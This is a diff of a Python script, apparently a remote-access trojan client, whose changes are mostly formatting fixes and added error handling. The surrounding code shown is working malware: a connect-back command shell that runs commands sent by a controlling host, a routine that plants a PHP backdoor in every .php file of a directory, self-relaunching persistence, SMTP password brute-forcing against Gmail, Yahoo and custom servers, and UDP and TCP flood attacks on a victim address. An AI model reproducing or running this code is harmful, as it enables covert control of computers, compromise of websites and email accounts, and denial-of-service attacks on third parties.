@@ -1,26 +1,26 @@
 #!/usr/bin/env python3
 
-## MIT License
+# MIT License
 ##
-## Copyright (c) 2017 Sayak Brahmachari
+# Copyright (c) 2017 Sayak Brahmachari
 ##
-## Permission is hereby granted, free of charge, to any person obtaining a copy
-## of this software and associated documentation files (the "Software"), to
-## deal in the Software without restriction, including without limitation the
-## rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
-## sell copies of the Software, and to permit persons to whom the Software is
-## furnished to do so, subject to the following conditions:
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to
+# deal in the Software without restriction, including without limitation the
+# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+# sell copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
 ##
-## The above copyright notice and this permission notice shall be included in
-## all copies or substantial portions of the Software.
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
 ##
-## THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-## IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-## FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-## AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-## LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
-## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
-## IN THE SOFTWARE.
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+# IN THE SOFTWARE.
 
 import subprocess
 import os
@@ -48,23 +48,27 @@ else:
 
 frozen = getattr(sys, 'frozen', False)
 
+
 def resource_path(relative_path):
     """ Get absolute path to resource, works for dev and for PyInstaller """
     try:
         # PyInstaller creates a temp folder and stores path in _MEIPASS
         base_path = sys._MEIPASS
     except Exception:
-        base_path = os.path.abspath(".")
+        base_path = os.path.abspath(os.path.dirname(__file__))
 
     return os.path.join(base_path, relative_path)
 
+
 temporary = open(resource_path('selfUpdate.py'), mode='r').read()\
-            .format(pid=os.getpid(), frozen=frozen, host=host,
-                    port=port, exe=sys.executable, arg=sys.argv[0])
+    .format(pid=os.getpid(), frozen=frozen, host=host,
+            port=port, exe=sys.executable, arg=sys.argv[0])
 backdoor = open(resource_path('backdoor.php'), mode='r').read()\
-            %(host, port, sys.executable, sys.argv[0], host, port)
+    % (host, port, sys.executable, sys.argv[0], host, port)
 
 # Bruteforce Helper funcs
+
+
 def product(*args, **kwds):
     pools = list(map(tuple, args)) * kwds.get('repeat', 1)
     result = [[]]
@@ -72,6 +76,7 @@ def product(*args, **kwds):
         result = [x+[y] for x in result for y in pool]
     for prod in result:
         yield tuple(prod)
+
 
 def repeat(obj, times=None):
     if times is None:
@@ -81,6 +86,7 @@ def repeat(obj, times=None):
         for _ in range(times):
             yield obj
 # Bruteforce Helper funcs END
+
 
 def selfUpdate():
     filename = str(random.randint(1, 1000))
@@ -96,16 +102,18 @@ def selfUpdate():
             multiprocessing.Process(target=__import__, args=(filename,))
         else:
             os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'
-                  .format(host=host, port=port, exe=sys.executable, arg=filename+'.py'))
+                      .format(host=host, port=port, exe=sys.executable, arg=filename+'.py'))
     else:
         os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &"
                   .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
+
 
 def send_msg(sock, proc, sem):
     while True:
         if sem.acquire(False):
             return
         sock.send(proc.stdout.read(1))
+
 
 def recv_msg(sock, proc, sem):
     while True:
@@ -115,12 +123,14 @@ def recv_msg(sock, proc, sem):
         if len(data) > 0:
             proc.stdin.write(data)
 
+
 def find_files(directory, pattern):
     for root, _, files in os.walk(directory):
         for basename in files:
             if fnmatch.fnmatch(basename, pattern):
                 filename = os.path.join(root, basename)
                 yield filename
+
 
 def debackdoor(thedir):
     allphp = find_files(thedir, '*.php')
@@ -141,6 +151,7 @@ def debackdoor(thedir):
                 f.write(backdoor)
                 f.close()
 
+
 def rmbackdoor(thedir):
     allphp = find_files(thedir, '*.php')
 
@@ -156,10 +167,12 @@ def rmbackdoor(thedir):
                 f.write(inside)
                 f.close()
 
+
 def savePass(password):
     f = open("password.txt", "w")
     f.write(password)
     f.close()
+
 
 def gmailbruteforce(email, combination, minimum, maximum):
     smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
@@ -182,6 +195,7 @@ def gmailbruteforce(email, combination, minimum, maximum):
         else:
             break
 
+
 def popularbruteforce(cmd):
     bruteinfo = cmd[1].split(":")
     if cmd[0] == "yahoobruteforce":
@@ -193,6 +207,7 @@ def popularbruteforce(cmd):
     t = threading.Thread(None, custombruteforce, None, (server, 587, bruteinfo[0], bruteinfo[1],
                                                         bruteinfo[2], bruteinfo[3]))
     t.start()
+
 
 def custombruteforce(address, smtpport, email, combination, minimum, maximum):
     smtpserver = smtplib.SMTP(address, int(smtpport))
@@ -215,6 +230,7 @@ def custombruteforce(address, smtpport, email, combination, minimum, maximum):
         else:
             break
 
+
 class udpFlood(threading.Thread):
     def __init__(self, victimip, victimport):
         threading.Thread.__init__(self)
@@ -231,6 +247,7 @@ class udpFlood(threading.Thread):
                 s.send(bytes(tmp, 'utf-8'))
             else:
                 break
+
 
 class tcpFlood(threading.Thread):
     def __init__(self, victimip, victimport):
@@ -250,6 +267,7 @@ class tcpFlood(threading.Thread):
             else:
                 break
 
+
 def udpUnleach(victimip, victimport):
     threads = []
     for _ in range(1, 21):
@@ -259,6 +277,7 @@ def udpUnleach(victimip, victimport):
 
     for thread in threads:
         thread.join()
+
 
 def tcpUnleach(victimip, victimport):
     threads = []
@@ -270,9 +289,11 @@ def tcpUnleach(victimip, victimport):
     for thread in threads:
         thread.join()
 
+
 def interact(s, command):
     commands = command.split()
-    if len(commands) == 0: return
+    if len(commands) == 0:
+        return
     if commands[0] == "cd":
         try:
             os.chdir(commands[1])
@@ -368,10 +389,10 @@ def interact(s, command):
                                   bruteinfo[4], bruteinfo[5]))
             t.start()
             s.send(bytes("[CLIENT] Bruteforcing started\n",
-                            'utf-8'))
+                         'utf-8'))
         except:
             s.send(bytes("[CLIENT] Wrong arguments\n",
-                            'utf-8'))
+                         'utf-8'))
     elif commands[0] == "hellows123":
         s.send(bytes(os.getcwd(), 'utf-8'))
     elif commands[0] == "quit":
@@ -379,27 +400,32 @@ def interact(s, command):
         print("[INFO] Connection Closed")
         return True
     elif commands[0] == "rawexec":
-        print("[INFO] Spawning {}".format(commands[1]))
-        sem1 = threading.Semaphore()
-        sem2 = threading.Semaphore()
-        sem1.acquire(False)
-        sem2.acquire(False)
-        p = subprocess.Popen(' '.join(commands[1:]), shell=True,
+        try:
+            s.send(bytes("[INFO] Spawning {}\n".format(commands[1]), 'utf-8'))
+            sem1 = threading.Semaphore()
+            sem2 = threading.Semaphore()
+            sem1.acquire(False)
+            sem2.acquire(False)
+            p = subprocess.Popen(' '.join(commands[1:]), shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT,
                                 stdin=subprocess.PIPE)
-        sender = threading.Thread(target=send_msg, args=(s, p, sem1,))
-        recver = threading.Thread(target=recv_msg, args=(s, p, sem2,))
-        sender.daemon = True
-        recver.daemon = True
-        sender.start()
-        recver.start()
-        p.wait()
-        sem1.release()
-        sem2.release()
-        while threading.active_count() > 1:
-            pass
-        s.send(bytes('stop', 'utf-8'))
+            sender = threading.Thread(target=send_msg, args=(s, p, sem1,))
+            recver = threading.Thread(target=recv_msg, args=(s, p, sem2,))
+            sender.daemon = True
+            recver.daemon = True
+            sender.start()
+            recver.start()
+            p.wait()
+            sem1.release()
+            sem2.release()
+            while threading.active_count() > 1:
+                pass
+            s.send(bytes('stop', 'utf-8'))
+        except Exception as ex:
+            s.send(bytes('stop', 'utf-8'))
+            time.sleep(1)
+            s.send(bytes("[CLIENT] Error - {}\n".format(ex), 'utf-8'))
     else:
         thecommand = ' '.join(commands)
         pipe = subprocess.PIPE
@@ -416,7 +442,7 @@ def interact(s, command):
                     s.send(bytes(en_STDOUT, 'utf-8'))
                 else:
                     s.send(bytes("[CLIENT] Command Executed",
-                                    'utf-8'))
+                                 'utf-8'))
             else:
                 print(en_STDERR)
                 s.send(bytes(en_STDERR, 'utf-8'))
@@ -424,7 +450,7 @@ def interact(s, command):
             comm.terminate()
             comm.kill()
             s.send(bytes("[CLIENT] Command Timed Out\n",
-                            'utf-8'))
+                         'utf-8'))
             STDOUT, STDERR = comm.communicate()
             en_STDERR = STDERR.decode()
             en_STDOUT = STDOUT.decode()
@@ -433,10 +459,11 @@ def interact(s, command):
                     print(en_STDOUT)
                     s.send(bytes(en_STDOUT, 'utf-8'))
 
+
 def main(host, port):
-    while 1:
+    while True:
         connected = False
-        while 1:
+        while True:
             while not connected:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -451,7 +478,8 @@ def main(host, port):
                 print(msg)
                 allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
                 for onebyone in allofem:
-                    if interact(s, onebyone): break
+                    if interact(s, onebyone):
+                        break
             except KeyboardInterrupt:
                 s.close()
                 print("[INFO] Connection Closed")
@@ -461,6 +489,7 @@ def main(host, port):
                 print("[INFO] Connection Closed Due to Error:", ex,
                       "\n", __import__('traceback').print_exc())
                 break
+
 
 if __name__ == '__main__':
     while True:
